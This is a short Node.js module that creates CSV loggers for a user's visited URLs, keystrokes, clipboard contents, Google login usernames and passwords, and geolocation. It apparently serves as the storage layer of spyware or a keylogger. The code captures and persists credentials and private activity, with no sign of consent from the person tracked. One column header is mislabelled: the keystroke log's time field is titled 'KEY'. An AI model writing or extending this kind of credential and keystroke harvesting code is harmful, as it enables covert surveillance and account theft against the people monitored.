//Citation: https://www.npmjs.com/package/csv-writer

const createCsvWriter = require('csv-writer').createObjectCsvWriter;
const filePath = "./logs/"
const urlTracker = createCsvWriter({
    path: filePath+'url.csv',
    header: [
        {id: 'datetime', title: 'TIME'},
        {id: 'url', title: 'URL'}

    ], append: true
});

const keystrokeTracker = createCsvWriter({
    path: filePath+'keystrokes.csv',
    header: [
        {id: 'datetime', title: 'KEY'},
        {id: 'key', title: 'KEY'}

    ], append: true
});

const clipTracker = createCsvWriter({
    path: filePath+'clipboard.csv',
    header: [
        {id: 'datetime', title: 'TIME'},
        {id: 'clip', title: 'CLIP'}

    ], append: true
});

const googleLoginTracker = createCsvWriter({
    path: filePath+'googleLogin.csv',
    header: [
        {id: 'username', title: 'USERNAME'},
        {id: 'password', title: 'PASSWORD'}
    ], append: true
});

const geoLocationTracker = createCsvWriter({
    path: filePath+'geoLocation.csv',
    header: [
        {id: 'datetime', title: 'TIME'},
        {id: 'lat', title: 'Lattitude'},
        {id: 'lng', title: 'Longitude'}
    ], append: true
});

module.exports = [urlTracker, keystrokeTracker, clipTracker, googleLoginTracker, geoLocationTracker];
